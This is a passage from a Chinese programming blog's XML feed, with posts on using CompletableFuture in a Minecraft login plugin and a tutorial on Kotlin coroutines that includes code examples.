class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初试CompletableFuture</title>
      <link href="/2021/08/28/try-completablefuture/"/>
      <url>/2021/08/28/try-completablefuture/</url>
      
        <content type="html"><![CDATA[<p>这个东西其实是在看了海螺大佬的博客(<a href="https://izzel.io/2020/02/12/chat-with-future/">如何问玩家“吾与徐公孰美？” | IzzelAliz’s Blog</a>)后才了解的，但在今天之前我其实一直只是在用它的回调函数来确保某些操作在一些耗时动作执行完后执行。</p><p>直到昨天为了做一个玩家按键跳过登入动画的功能，我又去看了这篇文章。不得不说，<strong>海螺是真的牛逼</strong></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>按照海螺在他博客里提供的思路，我照猫画虎整了一个监听玩家按键的功能。</p><p>在需要与玩家交流时注册一个监听器，交流完或者超时时关闭这个想法真的牛逼。我真想不到</p><p><strong>监听器类</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> <span class="token function">AskSkipOrNot</span><span class="token punctuation">(</span><span class="token keyword">private</span> <span class="token keyword">val</span> uuid<span class="token operator">:</span> UUID<span class="token punctuation">,</span>                   <span class="token keyword">private</span> <span class="token keyword">val</span> future<span class="token operator">:</span> CompletableFuture<span class="token operator">&lt;</span>Boolean<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token operator">:</span> Listener <span class="token punctuation">{</span>    <span class="token annotation builtin">@EventHandler</span>    <span class="token keyword">fun</span> <span class="token function">e</span><span class="token punctuation">(</span>e<span class="token operator">:</span> PlayerInteractEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>player<span class="token punctuation">.</span>uniqueId <span class="token operator">!=</span> uuid<span class="token punctuation">)</span> <span class="token keyword">return</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>SacredAuth<span class="token punctuation">.</span>conf<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"auth.display.skip-button"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">uppercase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"RIGHT"</span>            <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>action <span class="token operator">==</span> Action<span class="token punctuation">.</span>RIGHT_CLICK_AIR<span class="token punctuation">)</span> <span class="token punctuation">{</span>            future<span class="token punctuation">.</span><span class="token function">complete</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>            HandlerList<span class="token punctuation">.</span><span class="token function">unregisterAll</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>SacredAuth<span class="token punctuation">.</span>conf<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"auth.display.skip-button"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">uppercase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"LEFT"</span>            <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>action <span class="token operator">==</span> Action<span class="token punctuation">.</span>LEFT_CLICK_AIR<span class="token punctuation">)</span> <span class="token punctuation">{</span>            future<span class="token punctuation">.</span><span class="token function">complete</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>            HandlerList<span class="token punctuation">.</span><span class="token function">unregisterAll</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation builtin">@EventHandler</span>    <span class="token keyword">fun</span> <span class="token function">e</span><span class="token punctuation">(</span>e<span class="token operator">:</span> PlayerSwapHandItemsEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>player<span class="token punctuation">.</span>uniqueId <span class="token operator">!=</span> uuid<span class="token punctuation">)</span> <span class="token keyword">return</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>SacredAuth<span class="token punctuation">.</span>conf<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"auth.display.skip-button"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">uppercase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"F"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            future<span class="token punctuation">.</span><span class="token function">complete</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>            HandlerList<span class="token punctuation">.</span><span class="token function">unregisterAll</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>功能</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// 展示登录动画</span><span class="token keyword">fun</span> <span class="token function">toIconDisplayAnimation</span><span class="token punctuation">(</span>player<span class="token operator">:</span> Player<span class="token punctuation">,</span> func<span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> Unit <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    player<span class="token punctuation">.</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token string">"SacredAuth:icon-display"</span><span class="token punctuation">,</span> <span class="token function">FixedMetadataValue</span><span class="token punctuation">(</span>SacredAuth<span class="token punctuation">.</span>plugin<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> future <span class="token operator">=</span> CompletableFuture<span class="token operator">&lt;</span>Boolean<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> time <span class="token operator">=</span> conf<span class="token punctuation">.</span><span class="token function">getLong</span><span class="token punctuation">(</span><span class="token string">"auth.display.time"</span><span class="token punctuation">)</span>    KetherShell<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>conf<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"auth.display.script.display"</span><span class="token punctuation">)</span><span class="token operator">!!</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        sender <span class="token operator">=</span> player    <span class="token punctuation">}</span>    <span class="token comment">// 方法</span>    <span class="token keyword">fun</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        player<span class="token punctuation">.</span><span class="token function">removeMetadata</span><span class="token punctuation">(</span><span class="token string">"SacredAuth:icon-display"</span><span class="token punctuation">,</span> SacredAuth<span class="token punctuation">.</span>plugin<span class="token punctuation">)</span>        KetherShell<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>conf<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"auth.display.script.after-display"</span><span class="token punctuation">)</span><span class="token operator">!!</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            sender <span class="token operator">=</span> player        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    future<span class="token punctuation">.</span><span class="token function">thenRun</span> <span class="token punctuation">{</span>        <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        func<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">val</span> listener <span class="token operator">=</span> <span class="token function">AskSkipOrNot</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span>uniqueId<span class="token punctuation">,</span> future<span class="token punctuation">)</span>    Bukkit<span class="token punctuation">.</span><span class="token function">getPluginManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">registerEvents</span><span class="token punctuation">(</span>listener<span class="token punctuation">,</span> SacredAuth<span class="token punctuation">.</span>plugin<span class="token punctuation">)</span>    Tasks<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            future<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>time <span class="token operator">*</span> <span class="token number">50L</span><span class="token punctuation">,</span> TimeUnit<span class="token punctuation">.</span>MILLISECONDS<span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>ignored<span class="token operator">:</span> TimeoutException<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// 这里貌似future已经被中断了，因为超时了，所以future即使complete也不会执行他的回调函数</span>            <span class="token comment">// future.complete(true)</span>            <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            func<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解了一下Kotlin的协程</title>
      <link href="/2021/08/15/learn-kotlin-coroutine/"/>
      <url>/2021/08/15/learn-kotlin-coroutine/</url>
      
        <content type="html"><![CDATA[<h1 id="了解了一下Kotlin的协程"><a href="#了解了一下Kotlin的协程" class="headerlink" title="了解了一下Kotlin的协程"></a>了解了一下Kotlin的协程</h1><p>确实非常舒服，个人感觉比CompletableFuture方便</p><p>所以我想把今天学到的协程相关的知识都记录下来</p><h2 id="协程是什么？能做什么-跟多线程有什么不一样"><a href="#协程是什么？能做什么-跟多线程有什么不一样" class="headerlink" title="协程是什么？能做什么? 跟多线程有什么不一样?"></a>协程是什么？能做什么? 跟多线程有什么不一样?</h2><h3 id="摘自简书"><a href="#摘自简书" class="headerlink" title="摘自简书"></a>摘自简书</h3><p><a href="https://www.jianshu.com/p/76d2f47b900d">原地址</a></p><blockquote><p><strong><a href="https://coldrain-moro.github.io/content.html?id=8">协程</a></strong> - 也叫微线程，是一种新的多任务并发的操作手段(也不是很新，概念早就有了)</p></blockquote><blockquote><ul><li>特征：协程是运行在单线程中的并发程序</li><li>优点：省去了传统 Thread 多线程并发机制中切换线程时带来的线程上下文切换、线程状态切&gt; &gt; 换、Thread 初始化上的性能损耗，能大幅度唐提高并发性能</li><li>漫画版概念解释：<a href="https://links.jianshu.com/go?to=https://www.sohu.com/a/236536167_684445">漫画：什么是协程？</a></li><li>简单理解：在单线程上由程序员自己调度运行的并行计算</li></ul></blockquote><blockquote><p>下面是关于协程这个概念的一些描述：</p></blockquote><blockquote><blockquote><p>协程的开发人员 Roman Elizarov 是这样描述协程的：协程就像非常轻量级的线程。线程是由系统调度的，线程切换或线程阻塞的开销都比较大。而协程依赖于线程，但是协程挂起时不需要阻塞线程，几乎是无代价的，协程是由开发者控制的。所以协程也像用户态的线程，非常轻量级，一个线程中可以创建任意个协程。</p></blockquote></blockquote><blockquote><blockquote><p>Coroutine，翻译成”协程“，初始碰到的人马上就会跟进程和线程两个概念联系起来。直接先说区别，Coroutine是编译器级的，Process和Thread是操作系统级的。Coroutine的实现，通常是对某个语言做相应的提议，然后通过后成编译器标准，然后编译器厂商来实现该机制。Process和Thread看起来也在语言层次，但是内生原理却是操作系统先有这个东西，然后通过一定的API暴露给用户使用，两者在这里有不同。Process和Thread是os通过调度算法，保存当前的上下文，然后从上次暂停的地方再次开始计算，重新开始的地方不可预期，每次CPU计算的指令数量和代码跑过的CPU时间是相关的，跑到os分配的cpu时间到达后就会被os强制挂起。Coroutine是编译器的魔术，通过插入相关的代码使得代码段能够实现分段式的执行，重新开始的地方是yield关键字指定的，一次一定会跑到一个yield对应的地方</p></blockquote></blockquote><blockquote><blockquote><p>对于多线程应用，CPU通过切片的方式来切换线程间的执行，线程切换时需要耗时（保存状态，下次继续）。协程，则只使用一个线程，在一个线程中规定某个代码块执行顺序。协程能保留上一次调用时的状态，不需要像线程一样用回调函数，所以性能上会有提升。缺点是本质是个单线程，不能利用到单个CPU的多个核</p></blockquote></blockquote><blockquote><p><strong><a href="https://coldrain-moro.github.io/content.html?id=8">协程和线程的对比：</a></strong></p></blockquote><blockquote><ul><li><strong><a href="https://coldrain-moro.github.io/content.html?id=8">Thread</a></strong> - 线程拥有独立的栈、局部变量，基于进程的共享内存，因此数据共享比较容易，但是多线程时需要加锁来进行访问控制，不加锁就容易导致数据错误，但加锁过多又容易出现死锁。线程之间的调度由内核控制(时间片竞争机制)，程序员无法介入控制(<code>即便我们拥有sleep、yield这样的API，这些API只是看起来像，但本质还是交给内核去控制，我们最多就是加上几个条件控制罢了</code>)，线程之间的切换需要深入到内核级别，因此线程的切换代价比较大，表现在：<br>* 线程对象的创建和初始化<br>* 线程上下文切换<br>* 线程状态的切换由系统内核完成<br>* 对变量的操作需要加锁</li></ul></blockquote><p><a href="https://coldrain-moro.github.io/content.html?id=8"><img src="https://coldrain-moro.github.io/content.html?id=8" alt="img"></a></p><blockquote><ul><li><strong><a href="https://coldrain-moro.github.io/content.html?id=8">Coroutine</a></strong> 协程是跑在线程上的优化产物，被称为轻量级 Thread，拥有自己的栈内存和局部变量，共享成员变量。传统 Thread 执行的核心是一个while(true) 的函数，本质就是一个耗时函数，Coroutine 可以用来直接标记方法，由程序员自己实现切换，调度，不再采用传统的时间段竞争机制。在一个线程上可以同时跑多个协程，同一时间只有一个协程被执行，在单线程上模拟多线程并发，协程何时运行，何时暂停，都是有程序员自己决定的，使用： <code>yield/resume</code> API，优势如下：</li></ul></blockquote><blockquote><ul><li>因为在同一个线程里，协程之间的切换不涉及线程上下文的切换和线程状态的改变，不存在资源、数据并发，所以不用加锁，只需要判断状态就OK，所以执行效率比多线程高很多</li></ul></blockquote><blockquote><ul><li>协程是非阻塞式的(也有阻塞API)，一个协程在进入阻塞后不会阻塞当前线程，当前线程会去执行其他协程任务</li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">![img](https:////upload-images.jianshu.io/upload_images/1785445-57bc06c143e5fcc9.jpeg?imageMogr2/auto-orient/strip|imageView2/2/w/724/format/webp)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>程序员能够控制协程的切换，是通过<code>yield</code> API 让协程在空闲时（比如等待io，网络数据未到达）放弃执行权，然后在合适的时机再通过<code>resume</code> API 唤醒协程继续运行。协程一旦开始运行就不会结束，直到遇到<code>yield</code>交出执行权。<code>Yield</code>、<code>resume</code> 这一对 API 可以非常便捷的实现<code>异步</code>，这可是目前所有高级语法孜孜不倦追求的</p></blockquote><blockquote><p>拿 python 代码举个例子，在一个线程里运行下面2个方法：</p></blockquote><blockquote><pre class="line-numbers language-none"><code class="language-none">def A():print '1'print '2print '3'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><pre class="line-numbers language-none"><code class="language-none">def B(): print 'x' print 'y' print 'z'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><p>假设由协程执行，每个方法都用协程标记，在执行A的过程中，可以随时中断，去执行B，B也可&gt; &gt; 能在执行过程中中断再去执行A，结果可能是：1 2 x y 3 z</p></blockquote><h3 id="协程优点之我见"><a href="#协程优点之我见" class="headerlink" title="协程优点之我见"></a>协程优点之我见</h3><ul><li><p>协程操作在大多数情况下比多线程操作性能好</p></li><li><p>写起来很爽，配合await你写异步操作就跟写同步操作一样</p></li><li><p>相比于CompletableFuture更厉害的地方在于它可以中断线程，一会儿过后再继续执行，<strong>操作方式更加自由</strong></p></li><li><blockquote><p>协程是非阻塞式的(也有阻塞API)，<strong>一个协程在进入阻塞后不会阻塞当前线程，当前线程会去执行其他协程任务</strong></p><p>这就很舒服了</p></blockquote></li></ul><h2 id="Kotlin中协程的使用方法"><a href="#Kotlin中协程的使用方法" class="headerlink" title="Kotlin中协程的使用方法"></a>Kotlin中协程的使用方法</h2><h3 id="依赖库"><a href="#依赖库" class="headerlink" title="依赖库"></a>依赖库</h3><p>kotlin的协程api并不包含在kotlin-stdlib中，跟kotlin的反射api一样，我们需要自行导入依赖</p><p>其实最新版本已经迭代到1.5.1了，只是最新版本必须要java16才能兼容，所以用了老版本</p><pre class="line-numbers language-none"><code class="language-none">compileOnly("org.jetbrains.kotlinx:kotlinx-coroutines-core:1.3.3")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="如何创建一个协程"><a href="#如何创建一个协程" class="headerlink" title="如何创建一个协程"></a>如何创建一个协程</h3><p>引用: <a href="https://www.jianshu.com/p/76d2f47b900d">kotlin - Coroutine 协程 - 简书 (jianshu.com)</a></p><blockquote><p>kotlin 里没有 new ，自然也不像 JAVA 一样 new Thread，另外 kotlin 里面提供了大量的高阶函数，所以不难猜出协程这里 kotlin 也是有提供专用函数的。kotlin 中 GlobalScope 类提供了几个携程构造函数：</p></blockquote><blockquote><ul><li><a href="https://coldrain-moro.github.io/content.html?id=8">launch</a> - 创建协程</li><li><a href="https://coldrain-moro.github.io/content.html?id=8">async</a> - 创建带返回值的协程，返回的是 Deferred 类</li><li><a href="https://coldrain-moro.github.io/content.html?id=8">withContext </a>- 不创建新的协程，在指定协程上运行代码块</li><li><a href="https://coldrain-moro.github.io/content.html?id=8">runBlocking</a> - 不是 GlobalScope 的 API，可以独立使用，区别是 runBlocking 里面的 delay 会阻塞线程，而 launch 创建的不会</li></ul></blockquote><blockquote><p>kotlin 在 1.3 之后要求协程必须由 CoroutineScope 创建，CoroutineScope 不阻塞当前线程，在后台创建一个新协程，也可以指定协程调度器。比如 CoroutineScope.launch{} 可以看成 new Coroutine</p></blockquote><h4 id="launch"><a href="#launch" class="headerlink" title="launch"></a>launch</h4><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">GlobalScope<span class="token punctuation">.</span><span class="token function">launch</span> <span class="token punctuation">{</span>    <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如此便创建了一个最简单的协程，这个协程是在主线程上创建的，换句话说，<strong>是同步的</strong></p><blockquote><ul><li>CoroutineContext</li></ul></blockquote><blockquote><p>- 可以理解为协程的上下文，在这里我们可以设置 CoroutineDispatcher 协程运行的线程调度器，有 4种线程模式：</p></blockquote><blockquote><ul><li>Dispatchers.Default</li><li>Dispatchers.IO -</li><li>Dispatchers.Main - 主线程</li><li>Dispatchers.Unconfined - 没指定，就是在当前线程</li></ul></blockquote><blockquote><p>不写的话就是 Dispatchers.Default 模式的</p></blockquote><p>它有一个返回值Job。<strong>可以把 Job 看成协程对象本身，协程的操作方法都在 Job 身上了</strong></p><blockquote><p>job.start() - 启动协程，除了 lazy 模式，协程都不需要手动启动</p></blockquote><blockquote><p>job.join() - 等待协程执行完毕</p></blockquote><blockquote><p>job.cancel() - 取消一个协程</p></blockquote><blockquote><p>job.cancelAndJoin() - 等待协程执行完毕然后再取消</p></blockquote><h4 id="async"><a href="#async" class="headerlink" title="async"></a>async</h4><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">GlobalScope<span class="token punctuation">.</span><span class="token function">async</span> <span class="token punctuation">{</span>    <span class="token comment">// 在异步线程中创建一个协程</span>    <span class="token comment">// 堵塞协程1s （即挂起协程）</span>    <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1000L</span><span class="token punctuation">)</span>    <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">invokeOnCompletion</span> <span class="token punctuation">{</span>    <span class="token comment">// 完成后执行(同步)</span>    <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"456"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个方法是在异步线程中创建协程，不同于launch返回Job，async返回的是Deferred类型</p><p>Deferred是Job的子类，包含Job的一切方法，除此之外，还新添了一个非常有用的方法 <strong>await</strong></p><p>这个方法用起来非常舒服，多线程操作用这个方法处理就跟处理同步操作一样</p><p>例子: (摘自简书)</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">GlobalScope<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span>Dispatchers<span class="token punctuation">.</span>Unconfined<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">val</span> deferred <span class="token operator">=</span> GlobalScope<span class="token punctuation">.</span><span class="token function">async</span><span class="token punctuation">{</span>  <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1000L</span><span class="token punctuation">)</span>  Log<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span><span class="token string">"This is async "</span><span class="token punctuation">)</span>  <span class="token keyword">return</span><span class="token label symbol">@async</span> <span class="token string">"taonce"</span>  <span class="token punctuation">}</span>  Log<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span><span class="token string">"协程 other start"</span><span class="token punctuation">)</span>  <span class="token keyword">val</span> result <span class="token operator">=</span> deferred<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  Log<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span><span class="token string">"async result is <span class="token interpolation variable">$result</span>"</span><span class="token punctuation">)</span>  Log<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span><span class="token string">"协程 other end "</span><span class="token punctuation">)</span><span class="token punctuation">}</span>Log<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span> <span class="token string">"主线程位于协程之后的代码执行，时间:  <span class="token interpolation"><span class="token delimiter variable">${</span>System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter variable">}</span></span>"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="runBlocking"><a href="#runBlocking" class="headerlink" title="runBlocking"></a>runBlocking</h4><p><strong>该部分全部摘自简书</strong></p><p>runBlocking 和 launch 区别的地方就是 runBlocking 的 delay 方法是可以阻塞当前的线程的，和Thread.sleep() 一样，看下面的例子:</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token operator">&lt;</span>String<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  runBlocking <span class="token punctuation">{</span>    <span class="token comment">// 阻塞1s</span>    <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1000L</span><span class="token punctuation">)</span>    <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"This is a coroutines <span class="token interpolation"><span class="token delimiter variable">${</span>TimeUtil<span class="token punctuation">.</span><span class="token function">getTimeDetail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter variable">}</span></span>"</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment">// 阻塞2s</span>  Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000L</span><span class="token punctuation">)</span>  <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"main end <span class="token interpolation"><span class="token delimiter variable">${</span>TimeUtil<span class="token punctuation">.</span><span class="token function">getTimeDetail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter variable">}</span></span>"</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>~~~~~~~~~~~~~~log~~~~~~~~~~~~~~~~This <span class="token keyword">is</span> a coroutines <span class="token number">11</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">51</span>main end <span class="token number">11</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">53</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>runBlocking 通常的用法是用来桥接普通阻塞代码和挂起风格的非阻塞代码，在 runBlocking 闭包里面启动另外的协程，协程里面是可以嵌套启动别的协程的。</p><h3 id="suspend-关键字"><a href="#suspend-关键字" class="headerlink" title="suspend 关键字"></a>suspend 关键字</h3><p>被修饰的函数可以称作<strong>挂起函数</strong></p><p><strong>没用suspend标记的方法不能参加协程任务，suspend修饰的方法只能与另一个被suspend修饰的方法进行交流</strong></p><p><strong>协程本身也是挂起函数</strong></p><h2 id="实际运用"><a href="#实际运用" class="headerlink" title="实际运用"></a>实际运用</h2><p>代码来自我的SacredBank</p><p>之前玩家仓库翻页时更新数据库就是很普通的async task，而翻到下一页这个操作是同步的</p><p>这可能会导致玩家仓库数据尚未及时更新就翻到下一页，可能会出现玩家打开仓库中的物品与数据库中储存的玩家仓库物品不一致</p><p>运用协程巧妙的解决了这个问题</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// 返回一个Deffered实例    </span><span class="token keyword">fun</span> <span class="token function">saveWarehouse</span><span class="token punctuation">(</span><span class="token operator">inv</span><span class="token operator">:</span> Inventory<span class="token punctuation">,</span> holder<span class="token operator">:</span> BankHolder<span class="token punctuation">)</span><span class="token operator">:</span> Deferred<span class="token operator">&lt;</span>Unit<span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> GlobalScope<span class="token punctuation">.</span><span class="token function">async</span> <span class="token punctuation">{</span>            <span class="token operator">inv</span><span class="token punctuation">.</span><span class="token function">removeItem</span><span class="token punctuation">(</span>item_previous_page<span class="token punctuation">,</span> item_next_page<span class="token punctuation">,</span> item_current_page<span class="token punctuation">,</span> SacredBank<span class="token punctuation">.</span>lockItem<span class="token punctuation">)</span>            <span class="token keyword">val</span> profile <span class="token operator">=</span> Database<span class="token punctuation">.</span>selectedDB<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span>Bukkit<span class="token punctuation">.</span><span class="token function">getOfflinePlayer</span><span class="token punctuation">(</span>holder<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?:</span> <span class="token function">PlayerProfile</span><span class="token punctuation">(</span>Bukkit<span class="token punctuation">.</span><span class="token function">getOfflinePlayer</span><span class="token punctuation">(</span>holder<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>uniqueId<span class="token punctuation">)</span>            <span class="token operator">inv</span><span class="token punctuation">.</span><span class="token function">forEachIndexed</span> <span class="token punctuation">{</span> i<span class="token punctuation">,</span> item <span class="token operator">-&gt;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">45</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span><span class="token function">isNotAir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> profile<span class="token punctuation">.</span>warehouseItems<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">45</span> <span class="token operator">*</span> <span class="token punctuation">(</span>holder<span class="token punctuation">.</span>warehouse_page <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> item                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">45</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span><span class="token function">isAir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> profile<span class="token punctuation">.</span>warehouseItems<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">45</span> <span class="token operator">*</span> <span class="token punctuation">(</span>holder<span class="token punctuation">.</span>warehouse_page <span class="token operator">-</span> <span class="token 